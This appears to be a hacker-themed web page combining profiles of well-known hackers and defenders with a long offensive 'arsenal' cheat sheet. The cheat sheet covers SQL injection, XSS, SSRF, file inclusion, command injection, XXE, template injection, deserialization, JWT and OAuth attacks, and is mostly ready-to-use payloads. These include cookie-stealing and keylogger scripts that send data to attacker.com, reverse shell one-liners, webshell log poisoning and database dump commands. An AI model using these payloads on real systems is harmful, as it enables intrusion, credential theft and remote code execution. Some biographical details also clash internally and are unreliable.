🖥
Kevin Mitnick
CONDOR
DECEASED 2023

Era: 1980s-2000 | Specialty: Social engineering, phone phreaking, network intrusion

Once the FBI's most-wanted computer criminal. Infiltrated Nokia, Motorola, Sun Microsystems, Pentagon systems — not for money, but for the intellectual challenge. His weapon was his voice: he could talk his way into any system. Served 5 years federal (including 8 months solitary). Became the world's most famous security consultant after release. Authored The Art of Intrusion and The Art of Deception — still the best books on social engineering ever written.

🇬🇧
Gary McKinnon
SOLO
REFORMED

Era: 2001-2002 | Specialty: NASA / Pentagon intrusion, UFO research

Conducted the largest military computer hack in history from his bedroom in North London using a 56k dial-up modem. Accessed 97 US military and NASA computers including US Army, Navy, Air Force, DoD and NASA networks — looking for evidence of UFOs and free energy suppression. Left notes: "Your security is crap." US sought 70 years extradition. Avoided it on human rights / Asperger grounds. Changed UK cybercrime law.

👑
Anonymous
LEGION
ACTIVE

Era: 2003-Present | Specialty: DDoS, doxing, hacktivism, OpSec chaos

Not a person — a leaderless internet collective that became the world's most recognisable hacktivist brand. Emerged from 4chan. Key ops: OpPayback (Visa/Mastercard/PayPal DDoS over WikiLeaks), OpSony, Arab Spring ops, OpISIS, hack of HBGary Federal (Aaron Barr dox). The Guy Fawkes mask is now universally recognised. Spawned LulzSec. FBI honeypots eventually jailed many core members but the brand lives on.

👻
Shadow Brokers
SHADOWBROKERS
IDENTITY UNKNOWN

Era: 2016-2017 | Specialty: NSA TAO tool theft and release

Stole and publicly released the NSA's most powerful offensive hacking tools — allegedly from a staging server. The August 2016 dump included EternalBlue (the exploit that powered WannaCry and NotPetya). Theory: Russian intelligence, disgruntled NSA contractor, or an NSA insider. Never identified. Their blog posts were written in broken English possibly as misdirection. The EternalBlue leak alone caused $100B+ in global damage via secondary attacks.

⚡
Aaron Swartz
THINKER
DECEASED 2013

Era: 2010-2013 | Specialty: Open access, civil disobedience, internet freedom

Co-created RSS at age 14. Co-founded Reddit. Built the framework that became Creative Commons. Was a genius, not a criminal — yet the DOJ hit him with 35 years of federal charges and $1M in fines for downloading 4.8M academic papers from JSTOR via MIT's network, believing academic knowledge should be free. Faced with decades in prison, he took his own life at 26. His death changed the conversation about prosecutorial overreach in cybercrime cases.

📡
Julian Assange
MENDAX
RELEASED 2024

Era: 1987-Present | Specialty: Whistleblowing, radical transparency, secure drop infrastructure

Hacked as a teenager under alias "Mendax" — broke into Pentagon, NASA, Nortel. Co-founded WikiLeaks in 2006. Published 251,287 US diplomatic cables (Cablegate), Iraq War Logs, Afghan War Diary, and the "Collateral Murder" Apache helicopter video. Sought under the Espionage Act for 18 charges carrying 175 years. 7 years in the Ecuadorian embassy, 5 years in Belmarsh. Released June 2024 after pleading guilty to a single count. Changed journalism and surveillance law globally.

🐈
Hector Monsegur
SABU
REFORMED / INFORMANT

Era: 2011-2012 | Specialty: LulzSec leader, SQLi, rootkits, botnet ops

Co-founded LulzSec — the most theatrical hacking crew ever. In 51 days hit Sony (1M accounts), FBI, CIA, UK SOCA, Fox, PBS, Senate.gov. FBI turned him in 2011 after one Tor slip. Secretly recorded 250+ hours of fellow members, leading to arrest of Topiary, Kayla, T-Flow, and others. Sentenced to time served. The betrayal fractured the hacktivist movement permanently.

🔧
Mudge (Peiter Zatko)
MUDGE
ACTIVE — WHISTLEBLOWER

Era: 1993-Present | Specialty: Exploit dev, L0pht, DARPA, Twitter security

Founding member of L0pht. Testified to the US Senate in 1998: "We could take down the internet in 30 minutes." Created L0phtCrack, wrote seminal buffer overflow docs. Led DARPA Cyber Fast Track, headed Google ATAP security, then Twitter security. 2022: became whistleblower against Twitter, testifying that executives lied to regulators about security and bots. Only hacker to brief the US Senate twice.

🔞
Lapsus$
DEV-0537
ARRESTED 2022

Era: 2021-2022 | Specialty: Social engineering, SIM swapping, insider recruitment, extortion

Teenagers (aged 16-21) with no advanced malware who caused more damage than most nation-states through pure social engineering. Breached Microsoft, Nvidia, Samsung (35GB incl. TrustZone bootloader), Okta (366 customers), T-Mobile, Ubisoft, EA. Method: bribed insiders, SIM-swapped employees, called IT helpdesks while the real employee slept. Leader "White" was 17, from Oxford. Proof your $200M firewall means nothing if an intern picks up the phone.

💀
Robert T. Morris
Morris Worm Author
MIT PROFESSOR

Era: 1988 | Specialty: Network exploitation, Unix systems

On November 2, 1988, a 23-year-old Cornell graduate student released the first internet worm. The Morris Worm exploited Unix sendmail, fingerd, and rsh/rexec vulnerabilities to spread autonomously across ~6,000 machines (10% of the internet). Morris claimed it was an experiment, not malicious — but a bug caused it to reinfect machines repeatedly, crashing them. Became the first person convicted under the Computer Fraud and Abuse Act. Sentenced to 3 years probation and $10,050 fine. Now a tenured professor at MIT CSAIL and co-founder of Y Combinator.

🧒
Jonathan James
c0mrade
DIED 2008

Era: 1999-2000 | Age at first hack: 15

First juvenile imprisoned in the US for cybercrime. At age 15, hacked DISA (Defense Information Systems Agency), installed a backdoor on a BellSouth server, and — most notoriously — compromised NASA's Marshall Space Flight Center, downloading $1.7M worth of International Space Station source code (life support and temperature control software). NASA had to shut down its computers for 3 weeks. Also penetrated Department of Defense computers. Sentenced to 6 months house arrest at 16. In 2008, committed suicide at age 24, leaving a note saying he believed he would be falsely prosecuted in connection with the TJX hack investigation.

💳
Albert Gonzalez
soupnazi
40 YEARS 2010

Era: 2003-2008 | Specialty: POS malware, SQL injection, carding

Masterminded the largest credit card theft in US history. Led a crew that used wardriving (driving with a laptop scanning for unsecured WiFi) to breach retailers: TJ Maxx, Marshalls, Barnes & Noble, Sports Authority, Dave & Buster's. Installed custom sniffer malware on POS systems that skimmed card data in real-time. Stole 170 million+ credit and debit card numbers. Laundered money through Eastern European banks. Twist: Gonzalez was simultaneously working as a paid informant for the US Secret Service while running his crime ring. Sentenced to 20 years — largest identity theft sentence in US history at the time.

🕵️
Adrian Lamo
The Homeless Hacker
DIED 2018

Era: 2001-2010 | Specialty: Social engineering, proxy exploitation

Known as "The Homeless Hacker" for hacking from Kinko's copy shops and coffee shops while living as a transient. Hacked The New York Times (added himself to the expert database), Microsoft, Yahoo!, MCI WorldCom — then often notified victims of their vulnerabilities. Became notorious in 2010 when Army intelligence analyst Chelsea Manning contacted him confessing to leaking hundreds of thousands of documents to WikiLeaks. Lamo reported Manning to the FBI and Army, leading to Manning's arrest and 35-year sentence (later commuted by Obama). The hacker community considered this the ultimate betrayal. Lamo defended it as preventing harm. Died suddenly in 2018 at age 37.

// SQL INJECTION — COMPLETE ARSENAL
SQL Injection occurs when untrusted data is sent to an interpreter as part of a command. The attacker can read, modify, delete database data, or execute admin operations.
-- 1. DETECTION
'                           -- single quote breaks query
'--                         -- comment rest of query
' OR '1'='1'               -- always-true condition
' OR 1=1--                  -- classic auth bypass
1; SELECT SLEEP(5)--        -- time-based blind

-- 2. UNION-BASED (need same # columns)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--  -- add NULLs until no error
' UNION SELECT user(),database(),version()--

-- 3. INFORMATION SCHEMA DUMP
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- 4. BLIND BOOLEAN-BASED
' AND 1=1--     -- true condition
' AND 1=2--     -- false condition (different response = vulnerable)
' AND SUBSTRING(password,1,1)='a'--

-- 5. TIME-BASED BLIND
'; IF(1=1) WAITFOR DELAY '0:0:5'--   -- MSSQL
' AND SLEEP(5)--                       -- MySQL
' AND 1=1 AND pg_sleep(5)--            -- PostgreSQL

-- 6. OUT-OF-BAND (DNS exfil)
'; exec master..xp_dirtree '//attacker.com/'--  -- MSSQL

-- 7. SQLMAP AUTOMATION
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/" --data="user=1&pass=test" --level=5 --risk=3
// CROSS-SITE SCRIPTING (XSS) — ARSENAL
XSS lets attackers inject client-side scripts into web pages viewed by other users. Can steal cookies, session tokens, redirect users, or perform actions as victim.
-- BASIC PAYLOADS --
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

-- FILTER BYPASS --
<ScRiPt>alert(1)</ScRiPt>              -- case variation
<img src=x onerror=alert(1)>  -- hex entities
<script>eval(atob('YWxlcnQoMSk='))</script>  -- base64
<svg/onload=alert`1`>                  -- template literal
javascript:alert(1)                    -- URL context

-- COOKIE THEFT --
<script>
  new Image().src="https://attacker.com/steal?c="+document.cookie;
</script>

-- KEYLOGGER PAYLOAD --
<script>
  document.onkeypress=function(e){
    new Image().src="https://attacker.com/k?k="+e.key;
  }
</script>

-- DOM-BASED XSS --
-- URL: https://target.com/page#<img src=x onerror=alert(1)>
-- JS code: document.getElementById('x').innerHTML = location.hash

-- XSS POLYGLOT --
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()/>
// SERVER-SIDE REQUEST FORGERY (SSRF)
SSRF makes the server perform requests on attacker's behalf. Used to access internal services, cloud metadata, bypass firewalls, and pivot to internal networks.
-- AWS METADATA (most critical) --
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

-- GCP METADATA --
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/project-id

-- AZURE METADATA --
http://169.254.169.254/metadata/instance?api-version=2021-02-01

-- INTERNAL NETWORK SCANNING --
http://192.168.1.1/                     -- router
http://127.0.0.1:6379/                  -- Redis (unauthenticated)
http://127.0.0.1:9200/_cat/indices      -- Elasticsearch
http://127.0.0.1:2375/info              -- Docker daemon

-- BYPASS TECHNIQUES --
http://0x7f000001/                      -- hex IP
http://0177.0.0.1/                      -- octal IP
http://[::1]/                           -- IPv6 localhost
http://localtest.me/                    -- resolves to 127.0.0.1
http://①②⑦.⓪.⓪.①/                   -- unicode
http://127.1/                           -- short form

-- PROTOCOL SMUGGLING --
gopher://127.0.0.1:6379/_%2a1%0d%0a%24%38%0d%0aflushall
// LOCAL FILE INCLUSION (LFI) / PATH TRAVERSAL
LFI allows attackers to read files from the server filesystem. Can expose passwords, SSH keys, source code, and lead to RCE via log poisoning.
-- BASIC TRAVERSAL --
../../../etc/passwd
..\..\..\windows\win.ini             -- Windows
....//....//....//etc/passwd          -- double-slash bypass

-- ENCODED BYPASS --
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  -- URL encoded
%252e%252e%252f                            -- double URL encoded
..%c0%af../                               -- unicode slash

-- HIGH VALUE TARGETS (Linux) --
/etc/passwd                              -- user list
/etc/shadow                              -- password hashes (needs root)
/etc/hosts                               -- network map
/proc/self/environ                       -- env vars (may contain secrets)
/proc/self/cmdline                       -- running process
/var/log/apache2/access.log              -- log poisoning target
/home/user/.ssh/id_rsa                   -- SSH private key
~/.bash_history                          -- command history

-- LOG POISONING TO RCE --
-- Step 1: inject PHP into User-Agent header:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

-- Step 2: LFI the log with cmd parameter:
http://target.com/?page=../../../var/log/apache2/access.log&cmd=id

-- PHP WRAPPERS --
php://filter/convert.base64-encode/resource=index.php  -- read PHP source
php://input (POST body)                                 -- code injection
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
// COMMAND INJECTION
Command injection occurs when an application passes unsafe user data to a system shell. Attacker can execute arbitrary OS commands with the server's privileges.
-- LINUX SEPARATORS --
; id                    -- sequential execution
&& id                   -- execute if previous succeeds  
|| id                   -- execute if previous fails
| id                    -- pipe output
`id`                    -- backtick subshell
$(id)                   -- $() subshell

-- BLIND CMDI DETECTION --
; ping -c 5 127.0.0.1   -- 5-second delay
; sleep 5               -- explicit delay
; nslookup attacker.com -- DNS exfiltration
; curl http://attacker.com/$(id)  -- OOB with data

-- REVERSE SHELL ONE-LINERS --
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

-- FILTER BYPASS --
w\hom\i                -- backslash in command name
/???/???/id              -- glob wildcards
cat /etc/pa??wd          -- partial wildcard
{cat,/etc/passwd}        -- brace expansion (no spaces)
// XML EXTERNAL ENTITY (XXE) INJECTION
XXE exploits vulnerable XML parsers to read files, perform SSRF, or conduct DoS. Common in file upload endpoints, SOAP APIs, and document converters.
<!-- BASIC FILE READ -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF VIA XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- BLIND XXE (OOB via DTD) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- evil.dtd on attacker server: -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
%all;

<!-- BILLION LAUGHS (DoS) -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
// SERVER-SIDE TEMPLATE INJECTION (SSTI)
SSTI occurs when user input is embedded unsafely into a template engine. Can lead to RCE as the server evaluates the injected template expression.
-- DETECTION POLYGLOT --
${{{<%[%'"}}%         -- trigger error to identify engine
{{7*7}}              -- Jinja2/Twig: returns 49
${7*7}               -- Freemarker/Smarty
#{7*7}               -- Ruby ERB
<%= 7*7 %>          -- Ruby ERB
{{7*'7'}}            -- Jinja2: returns 7777777 | Twig: returns 49

-- JINJA2 (Python/Flask) RCE --
{{config.items()}}                                      -- dump config
{{''.__class__.__mro__[1].__subclasses__()}}           -- list classes
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-- Simpler Jinja2 RCE:
{{cycler.__init__.__globals__.os.popen('id').read()}}

-- TWIG (PHP) RCE --
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

-- FREEMARKER (Java) RCE --
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

-- TOOLS --
tplmap -u "http://target.com/?name=*" --os-shell
tplmap -u "http://target.com/?name=*" --os-cmd "id"
// INSECURE DESERIALIZATION
Deserialization attacks occur when untrusted data is used to reconstruct an object. Can lead to RCE, privilege escalation, or DoS depending on the language and available gadget chains.
-- JAVA (ysoserial gadget chains) --
java -jar ysoserial.jar CommonsCollections6 "id" | base64
java -jar ysoserial.jar URLDNS "http://attacker.com" | base64
# Detection: serialized Java objects start with: AC ED 00 05 (hex) or rO0AB (base64)
# Tools: ysoserial, gadgetinspector, marshalsec

-- PHP (unserialize() abuse) --
# PHP object: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
# Magic methods exploited: __wakeup(), __destruct(), __toString()
# Attack: craft serialized object that triggers code in __destruct:
class Exploit {
  public $cmd = "id";
  public function __destruct() { system($this->cmd); }
}
echo base64_encode(serialize(new Exploit()));
# Tools: phpggc (PHP gadget chains)
phpggc Laravel/RCE1 system id | base64

-- PYTHON (pickle) --
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
# Any app using pickle.loads() on user input is vulnerable

-- .NET (BinaryFormatter) --
# Use ysoserial.net for .NET gadget chains
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
# ViewState attacks: if __VIEWSTATE not signed/encrypted = RCE via BinaryFormatter
// JWT ATTACKS — JSON WEB TOKEN EXPLOITATION
JWTs are widely used for auth. Misconfigured signing, algorithm confusion, or weak secrets make them a prime target. A compromised JWT = account takeover or privilege escalation.
-- JWT STRUCTURE --
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.SIG
# Decode: echo "eyJzdWIiOiJ1c2VyIn0" | base64 -d

-- ATTACK 1: none algorithm --
# Change "alg":"HS256" to "alg":"none", remove signature
header = base64({"alg":"none","typ":"JWT"})
payload = base64({"sub":"admin","role":"admin"})
token = header + "." + payload + "."   # empty signature!
# Vulnerable if server accepts alg:none

-- ATTACK 2: algorithm confusion (RS256 to HS256) --
# If server uses RS256 (asymmetric), get the public key
# Sign token with HS256 using the PUBLIC KEY as the HMAC secret
# Server may verify HS256 with the public key = valid signature!
python3 jwt_tool.py TOKEN -X k -pk public.pem

-- ATTACK 3: weak secret brute-force --
hashcat -a 0 -m 16500 eyJ...TOKEN... rockyou.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt

-- ATTACK 4: kid header injection --
# "kid" (key ID) header used to select signing key
# If kid used in DB query or file path:
{"alg":"HS256","kid":"../../dev/null"}  # sign with empty string
{"alg":"HS256","kid":"x' UNION SELECT 'attackerkey'--"}  # SQLi in kid

-- TOOLS --
python3 jwt_tool.py TOKEN --all    # full JWT attack suite
jwt_tool -T TOKEN                  # tamper mode interactive
// OAUTH 2.0 FLAWS — ACCOUNT TAKEOVER
OAuth 2.0 is the standard for delegated authorization. Implementation flaws are rampant and can lead to account takeover, token theft, and privilege escalation.
-- ATTACK 1: redirect_uri manipulation --
# OAuth redirects auth code to redirect_uri after login
# If redirect_uri not strictly validated:
https://target.com/oauth/authorize?
  client_id=app&
  redirect_uri=https://attacker.com/steal&  # steal the code
  response_type=code

-- ATTACK 2: state parameter CSRF --
# state param prevents CSRF in OAuth flow
# If state missing or not validated:
# Force victim to complete OAuth flow binding THEIR account to attacker
# Result: attacker logs into victim's account via their own OAuth session

-- ATTACK 3: implicit flow token leakage --
# Implicit flow puts access_token in URL fragment
# Referrer header leaks token to third-party resources on the page

-- ATTACK 4: open redirect + code theft --
# If app has open redirect: ?next=https://attacker.com
# Use as redirect_uri: redirect_uri=https://target.com/redirect?to=attacker.com
# Code sent to target.com, redirected to attacker with code in Referer

-- ATTACK 5: scope escalation --
# Modify scope parameter: scope=email+profile
# Try: scope=admin+read:all+write:all
# Some poorly validated OAuth servers grant requested scope

-- ATTACK 6: PKCE bypass (mobile apps) --
# Intercept authorization code from deep link / app scheme
# If PKCE not implemented or code_verifier not validated: replay code

-- TOOLS --
Burp Suite - intercept and modify OAuth flows
oauth2-toolkit Burp extension
Manual: always check state, redirect_uri, scope, code reuse
TS/SCI // NOFORN // ORCON

▲ CYBER COMMAND — DEFENDER DOSSIERS

13 SUBJECTS // CLASSIFIED INTELLIGENCE PROFILES // AUTHORIZED PERSONNEL ONLY
DEF-001 MICHAEL CHERTOFF CLASSIFICATION: SECRET
ROLE2nd U.S. Secretary of Homeland Security (2005–2009)
ORGThe Chertoff Group — cybersecurity consulting firm, D.C.
SPECIALTYCritical infrastructure protection, national cyber policy, public-private partnerships
KEY INTELOversaw creation of NCCIC (National Cybersecurity & Communications Integration Center). Post-DHS founded The Chertoff Group advising Fortune 500 and governments on cyber risk. Co-authored landmark DHS cyber strategy. Warned publicly about nation-state threats to power grid and financial systems years before they materialized.
KNOWN FOR"Cyber threats to critical infrastructure are existential. We cannot afford to treat them as an IT problem."
DEF-002 CHRIS KUBECKA CLASSIFICATION: SECRET
ROLEIndependent Security Researcher / CEO HypaSec
BACKGROUNDFormer USAF, security operations. Led international incident response post-Shamoon.
SPECIALTYICS/SCADA security, cyber warfare, incident response, threat intelligence
KEY INTELRecruited by Saudi Aramco after the 2012 Shamoon attack to lead recovery of 35,000 wiped workstations — the largest corporate cyber attack in history at the time. Rebuilt Aramco's entire network from scratch in weeks. Author of "Down the Rabbit Hole" and "Hacking ISIS." One of the few people who has seen a full-scale nation-state attack from the inside and survived to document it.
KNOWN FORSaudi Aramco Shamoon recovery (2012). ICS-CERT cooperation. Cyber warfare law research.
INC-001 OPERATION SHAMOON — SAUDI ARAMCO CLASSIFICATION: TOP SECRET
DATEAugust 15, 2012 — one of history's most destructive cyber attacks
TARGETSaudi Aramco — world's largest oil producer, 330,000 employees
ATTRIBUTIONIran (APT33 / Elfin) — retaliation for Stuxnet + Western sanctions
METHODShamoon wiper malware. Infiltrated via spear-phishing. Spread across internal network via Windows shares. Overwrote MBR + all files with image of burning American flag. Killed 35,000 workstations in ~2.5 hours.
IMPACTAramco resorted to pen and paper for months. Gas deliveries managed by fax. Company bought 50,000+ replacement hard drives — nearly exhausted global supply. Oil production lines (OT network) isolated and survived. Chris Kubecka led network reconstruction.
LESSONNetwork segmentation saved production. OT/IT separation is non-negotiable. Wiper malware = no recovery without offline backups.
DEF-003 JOHN MATHERLY CLASSIFICATION: SECRET
ROLEFounder — Shodan (est. 2009)
ORGShodan — the world's first search engine for internet-connected devices
SPECIALTYInternet-wide scanning, exposure intelligence, ICS/IoT attack surface mapping
KEY INTELBuilt Shodan at age 20 as a personal project to understand what's exposed on the internet. It indexes banners from ports 80, 443, 22, 21, 25, 161, 502 (Modbus/ICS) and hundreds more across the entire IPv4 space. Revealed that power plants, water treatment facilities, traffic control systems, and hospital equipment were directly internet-accessible with no authentication. Forced the security industry to take exposure management seriously.
KNOWN FOR"The scariest search engine on the internet." — CNNMoney. Made the invisible attack surface visible.
DEF-004 STUART McCLURE CLASSIFICATION: SECRET
ROLECo-Founder & CEO — Cylance (acquired by BlackBerry, 2019)
BACKGROUNDCo-authored "Hacking Exposed" series (est. 1999) — the bible of offensive security methodology.
SPECIALTYAI-driven endpoint security, offensive security methodology, enterprise threat hunting
KEY INTELFounded Foundstone (acquired by McAfee) then founded Cylance in 2012. Cylance was the first major security company to use machine learning (not signatures) to detect malware at runtime — predicting malware before it executes, not after. Proof that AI-first security could outperform legacy AV by predicting new malware families from mathematical features alone. Sold to BlackBerry for $1.4B.
KNOWN FOR"Hacking Exposed" books. Cylance — replaced signature-based AV with math.
DEF-005 MICHAEL DANIEL CLASSIFICATION: TOP SECRET
ROLEWhite House Cybersecurity Coordinator (2012–2017) / President, Cyber Threat Alliance
ORGNSC → Cyber Threat Alliance (CTA) — threat intelligence sharing consortium
SPECIALTYNational cyber strategy, public-private threat intel sharing, offensive cyber policy
KEY INTELServed as Obama's chief cybersecurity advisor. Coordinated U.S. response to OPM breach (21M records stolen by China), Sony Pictures hack (N. Korea), and Russian election interference. Developed the "Vulnerability Equities Process" — the framework for deciding when the U.S. government discloses vs. weaponizes software vulnerabilities. Now leads CTA, which lets competing security companies share malware indicators in real time to raise the collective defense floor.
KNOWN FORVulnerability Equities Process. CTA intel sharing model. "Nation-state hackers are playing chess. We're playing checkers."
DEF-006 BRETT LEATHERMAN CLASSIFICATION: SECRET
ROLESection Chief — FBI Cyber Division
ORGFederal Bureau of Investigation — Cyber Division, Washington D.C.
SPECIALTYNation-state cyber investigations, criminal hacker attribution, law enforcement cyber ops
KEY INTELThe FBI Cyber Division investigates intrusions against U.S. networks — from ransomware gangs to nation-state espionage. Works alongside NSA, CISA, and Cyber Command on attribution and disruption operations. The Division has indicted members of APT28 (Russia), APT40 (China), Lazarus Group (N. Korea), and OilRig (Iran). Key tool: the Victim Notification Program — contacting organizations who have been breached but don't know it yet.
KNOWN FORFBI cyber indictment program. Victim notification outreach. Nation-state threat briefings to private sector.
DEF-007 DAN KAMINSKY † CLASSIFICATION: LEGEND
ROLEChief Scientist — White Ops (now HUMAN Security) // 1979–2021
BACKGROUNDSelf-taught hacker, started at 11. Stanford dropout. Consulted for Microsoft, Cisco, Sony.
SPECIALTYProtocol security, DNS, cryptography, internet-scale vulnerability research
KEY INTELIn 2008, discovered a fundamental flaw in DNS (cache poisoning) that could redirect any internet traffic anywhere in the world. Instead of publishing immediately, he coordinated a secret patch with 80+ vendors simultaneously — releasing a fix before the exploit was public. One of the greatest coordinated vulnerability disclosures in history. Also worked on DNSSEC deployment and COVID-19 testing capacity. Died April 23, 2021 from diabetic ketoacidosis. Called "one of the greatest hackers of his generation" by Bruce Schneier.
KNOWN FORDNS cache poisoning (CVE-2008-1447). Coordinated the internet's largest-ever simultaneous patch. "The internet should just work."
DEF-008 MEREDITH PATTERSON CLASSIFICATION: SECRET
ROLESecurity Researcher / LangSec Pioneer / Cypherpunk
SPECIALTYLanguage-theoretic security (LangSec), formal methods, parser security, interdisciplinary research
KEY INTELFounded the LangSec movement: the insight that most security vulnerabilities exist because parsers (code that reads input) accept MORE than they should. If you treat all input as a formal language with a strict grammar, and reject anything that doesn't conform, entire classes of attacks (buffer overflows, SQL injection, XSS, XML attacks) become structurally impossible. Her work bridges computer science, linguistics, and biology — she has also done serious work in synthetic biology and computational linguistics. One of the rarest thinkers in security: attacks the root cause, not the symptoms.
KNOWN FORLangSec. "The Science of Insecurity" talk. Designing input handling so entire attack classes cannot exist.
DEF-009 LEON PANETTA CLASSIFICATION: TOP SECRET // SCI
ROLECIA Director (2009–2011) / Secretary of Defense (2011–2013)
ORGCentral Intelligence Agency → U.S. Department of Defense
SPECIALTYIntelligence community leadership, offensive cyber strategy, critical infrastructure defense
KEY INTELAs CIA Director, oversaw the agency during Stuxnet (the joint U.S.-Israel operation that destroyed Iranian centrifuges — the first known use of malware as a physical weapon). As SECDEF, delivered the famous "Cyber Pearl Harbor" speech (2012) warning that adversaries could attack power grids, water systems, and financial networks causing death and panic. Pushed to establish U.S. Cyber Command as a unified command. His warnings about critical infrastructure attacks proved prophetic — Colonial Pipeline (2021) and Ukraine grid attacks (2015, 2016) were exactly what he described.
KNOWN FOR"Cyber Pearl Harbor" (2012). CIA during Stuxnet. USCYBERCOM establishment. OBL operation authorization.
DEF-010 MARTY EDWARDS CLASSIFICATION: SECRET
ROLEFormer Director — ICS-CERT (2014–2017) / VP OT Security, Tenable
ORGDHS ICS-CERT → ISA → Tenable. The #1 authority on industrial control system cyber defense.
SPECIALTYOT/ICS/SCADA security, operational technology threat response, critical infrastructure hardening
KEY INTELLed ICS-CERT through the most dangerous period in OT security history — responding to Ukraine power grid attacks (BlackEnergy, Industroyer), Triton/TRISIS safety system attacks on Saudi petrochemicals, and multiple water utility intrusions. Established the NCCIC/ICS-CERT response playbook used by every utility today. ICS systems (PLCs, HMIs, SCADA) run power plants, dams, pipelines — they were never designed with security in mind. Edwards built the framework to defend them without taking them offline. Now at Tenable bridging IT and OT security visibility.
KNOWN FORICS-CERT leadership. Triton response. "You can't patch a centrifuge mid-operation — you have to design security in from the start."
DEF-011 MARC RODGERS CLASSIFICATION: SECRET
ROLEVP Cybersecurity — Cloudflare // DEF CON Security Lead
ORGCloudflare (protects ~20% of all internet traffic) / DEF CON Goon Squad leadership
SPECIALTYWeb application security, DDoS mitigation, IoT hacking, Apple device security research
KEY INTELAt Cloudflare, defends millions of websites from DDoS attacks (including record-breaking 71M RPS attack in 2023), bot attacks, and zero-day exploits in real time. Previously published influential research on compromising Tesla vehicles, Apple TV, and hotel door locks. Runs security operations at DEF CON — the world's largest hacker conference (30,000+ attendees). His dual role (offensive researcher + enterprise defender at internet scale) gives him visibility into both sides of the attack chain.
KNOWN FORCloudflare DDoS defense at scale. Tesla / IoT security research. DEF CON operations. "Attack and defense are the same knowledge — just applied differently."

CLASSIFIED // KGB CTR // COUNTER-INTELLIGENCE DIRECTORATE // NOFORN
▲ CYBER KILL CHAIN — LOCKHEED MARTIN / MITRE ATT&CK
01
RECONNAISSANCE
Passive: WHOIS, Shodan, cert transparency, LinkedIn, Google dorks. Active: Nmap, Amass, theHarvester. Goal: map attack surface without touching target systems.
Shodan · Amass · theHarvester · Maltego · Recon-ng
02
WEAPONIZATION
Create or adapt exploit payload. Combine vulnerability with backdoor. Generate malicious document, USB dropper, or web payload. Never deployed yet.
Metasploit · msfvenom · Veil · Evil-WinRM · Cobalt Strike
03
DELIVERY
Transmit weapon to target. Spear-phishing email, watering hole, USB drop, web exploit, supply chain. Social engineering is delivery.
GoPhish · SET · Evilginx · BeEF
04
EXPLOITATION
Trigger the vulnerability. User opens malicious file, clicks link, or system exploit fires. Code execution achieved. Access begins here.
Metasploit · sqlmap · Burp Suite · custom exploits
05
INSTALLATION
Install persistent backdoor. Registry keys, cron jobs, scheduled tasks, DLL hijacking, bootkit. Goal: survive reboots and user logoffs.
Cobalt Strike · Sliver · PowerSploit · SharPersist
06
C2 COMMS
Establish command-and-control channel. Implant beacons home over HTTPS/DNS/ICMP. Operator issues commands, receives data, deploys next stage.
Cobalt Strike · Havoc · Sliver · Mythic · Brute Ratel
07
ACTIONS ON OBJECTIVE
The actual mission: data exfiltration, lateral movement to target systems, ransomware deployment, destructive attack, espionage. Everything before was preparation.
BloodHound · Mimikatz · DCSync · exfil tools
ATT
MITRE ATT&CK
MITRE ATT&CK maps 14 Tactics, 200+ Techniques, and 400+ Sub-techniques observed in real-world attacks. Use Navigator at attack.mitre.org to plan or detect coverage gaps.
Tactics: Recon→Resource Dev→Init Access→Exec→Persist→PrivEsc→DefEvas→CredAccess→Discovery→LM→Collection→C2→Exfil→Impact
MaltegoOSINT
Visual link analysis. Maps relationships between people, orgs, domains, IPs, emails. GUI drag-and-drop intelligence network. Used by law enforcement and red teams alike.
# Community edition free at maltego.com # Transforms: HaveIBeenPwned, Shodan, VirusTotal, Censys # Key transforms: DNS → IP → ASN → Org → Related domains
